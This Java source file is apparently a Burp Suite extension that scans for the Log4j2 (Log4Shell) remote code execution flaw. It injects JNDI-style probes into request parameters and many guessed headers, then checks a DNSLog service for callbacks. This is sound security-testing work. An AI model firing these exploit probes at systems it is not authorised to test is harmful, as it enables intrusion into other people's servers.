package burp.scanner;

import burp.*;
import burp.dnslog.IDnslog;
import burp.dnslog.platform.Ceye;
import burp.dnslog.platform.DnslogCN;
import burp.poc.IPOC;
import burp.poc.impl.POC2;
import burp.utils.HttpHeader;
import burp.utils.ScanItem;
import burp.utils.Utils;

import java.util.*;
import java.util.stream.Stream;

public class Log4j2Scanner implements IScannerCheck {
    private BurpExtender parent;
    private IExtensionHelpers helper;
    private IDnslog dnslog;
    private IPOC poc;

    private final String[] HEADER_BLACKLIST = new String[]{
            "content-length",
            "cookie",
            "host",
            "content-type"
    };
    private final String[] HEADER_GUESS = new String[]{
            "User-Agent",
            "Referer",
            "X-Client-IP",
            "X-Remote-IP",
            "X-Remote-Addr",
            "X-Forwarded-For",
            "X-Originating-IP",
            "CF-Connecting_IP",
            "True-Client-IP",
            "X-Forwarded-For",
            "Originating-IP",
            "X-Real-IP",
            "Forwarded"
    };

    public Log4j2Scanner(final BurpExtender newParent) {
        this.parent = newParent;
        this.helper = newParent.helpers;
        this.poc = new POC2();
        this.dnslog = new DnslogCN();
        if (this.dnslog.getState()) {
            parent.stdout.println("Log4j2Scan loaded successfully!\r\n");
        } else {
            parent.stdout.println("Dnslog init failed!\r\n");
        }
    }

    public String urlencodeForTomcat(String exp) {
        exp = exp.replace("{", "%7b");
        exp = exp.replace("}", "%7d");
        return exp;
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        IRequestInfo req = this.parent.helpers.analyzeRequest(baseRequestResponse);
        List<IScanIssue> issues = new ArrayList<>();
        Map<String, ScanItem> domainMap = new HashMap<>();
        domainMap.putAll(paramsFuzz(baseRequestResponse, req));
        domainMap.putAll(headerFuzz(baseRequestResponse, req));
        try {
            Thread.sleep(2000); //sleep 2s, wait for network delay.
        } catch (InterruptedException e) {
            parent.stdout.println(e);
        }
        issues.addAll(finalCheck(baseRequestResponse, req, domainMap));
        parent.stdout.println(String.format("Scan complete: %s", req.getUrl()));
        return issues;
    }

    private Map<String, ScanItem> headerFuzz(IHttpRequestResponse baseRequestResponse, IRequestInfo req) {
        List<String> headers = req.getHeaders();
        Map<String, ScanItem> domainMap = new HashMap<>();
        byte[] rawRequest = baseRequestResponse.getRequest();
        List<String> guessHeaders = Arrays.asList(HEADER_GUESS);
        for (int i = 1; i < headers.size(); i++) {
            HttpHeader header = new HttpHeader(headers.get(i));
            if (Arrays.stream(HEADER_BLACKLIST).anyMatch(h -> h.toLowerCase() == header.Name.toLowerCase())) {
                String[] needSkipheader = (String[]) guessHeaders.stream().filter(h -> h.toLowerCase().equals(header.Name)).toArray();
                for (String headerName : needSkipheader) {
                    guessHeaders.remove(headerName);
                }
                List<String> tmpHeaders = new ArrayList<>(headers);
                String tmpDomain = dnslog.getNewDomain();
                header.Value = poc.generate(tmpDomain);
                tmpHeaders.set(i, header.toString());
                byte[] tmpRawRequest = helper.buildHttpMessage(tmpHeaders, Arrays.copyOfRange(rawRequest, req.getBodyOffset(), rawRequest.length));
                IHttpRequestResponse tmpReq = parent.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);
                domainMap.put(tmpDomain, new ScanItem(header.Name, tmpReq));
            }
        }
        for (String headerName :
                guessHeaders) {
            List<String> tmpHeaders = new ArrayList<>(headers);
            String tmpDomain = dnslog.getNewDomain();
            tmpHeaders.add(String.format("%s: %s", headerName, poc.generate(tmpDomain)));
            byte[] tmpRawRequest = helper.buildHttpMessage(tmpHeaders, Arrays.copyOfRange(rawRequest, req.getBodyOffset(), rawRequest.length));
            IHttpRequestResponse tmpReq = parent.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);
            domainMap.put(tmpDomain, new ScanItem(headerName, tmpReq));
        }
        return domainMap;
    }

    private Map<String, ScanItem> paramsFuzz(IHttpRequestResponse baseRequestResponse, IRequestInfo req) {
        Map<String, ScanItem> domainMap = new HashMap<>();
        byte[] rawRequest = baseRequestResponse.getRequest();
        parent.stdout.println(String.format("Scanning: %s", req.getUrl()));
        for (IParameter param :
                req.getParameters()) {
            try {
                String tmpDomain = dnslog.getNewDomain();
                byte[] tmpRawRequest = rawRequest;
                String exp = poc.generate(tmpDomain);
                boolean hasModify = false;
                switch (param.getType()) {
                    case IParameter.PARAM_URL:
                    case IParameter.PARAM_BODY:
                    case IParameter.PARAM_COOKIE:
                        exp = helper.urlEncode(exp);
                        exp = urlencodeForTomcat(exp);
                        IParameter newParam = helper.buildParameter(param.getName(), exp, param.getType());
                        tmpRawRequest = helper.updateParameter(rawRequest, newParam);
                        hasModify = true;
                        break;
                    case IParameter.PARAM_JSON:
                    case IParameter.PARAM_XML:
                    case IParameter.PARAM_MULTIPART_ATTR:
                    case IParameter.PARAM_XML_ATTR:
                        //unsupported.
                }
                if (hasModify) {
                    IHttpRequestResponse tmpReq = parent.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);
                    tmpReq.getResponse();
                    domainMap.put(tmpDomain, new ScanItem(param, tmpReq));

                }
            } catch (Exception ex) {
                parent.stdout.println(ex);
            }
        }
        return domainMap;
    }

    private List<IScanIssue> finalCheck(IHttpRequestResponse baseRequestResponse, IRequestInfo req, Map<String, ScanItem> domainMap) {
        List<IScanIssue> issues = new ArrayList<>();
        if (dnslog.flushCache()) {
            for (Map.Entry<String, ScanItem> domainItem :
                    domainMap.entrySet()) {
                ScanItem item = domainItem.getValue();
                boolean hasIssue = dnslog.CheckResult(domainItem.getKey());
                if (hasIssue) {
                    issues.add(new Log4j2Issue(baseRequestResponse.getHttpService(),
                            req.getUrl(),
                            new IHttpRequestResponse[]{baseRequestResponse, item.TmpRequest},
                            "Log4j2 RCE Detected",
                            String.format("Vulnerable param is \"%s\" in %s.", item.IsHeader ? item.HeaderName : item.Param.getName(), item.IsHeader ? "Header" : getTypeName(item.Param.getType())),
                            "High"));
                }
            }
        } else {
            parent.stdout.println("get dnslog result failed!\r\n");
        }
        return issues;
    }

    private String getTypeName(int typeId) {
        switch (typeId) {
            case IParameter.PARAM_URL:
                return "URL";
            case IParameter.PARAM_BODY:
                return "Body";
            case IParameter.PARAM_COOKIE:
                return "Cookie";
            case IParameter.PARAM_JSON:
                return "Body-json";
            case IParameter.PARAM_XML:
                return "Body-xml";
            case IParameter.PARAM_MULTIPART_ATTR:
                return "Body-multipart";
            case IParameter.PARAM_XML_ATTR:
                return "Body-xml-attr";
            default:
                return "unknown";
        }
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        return 0;
    }
}
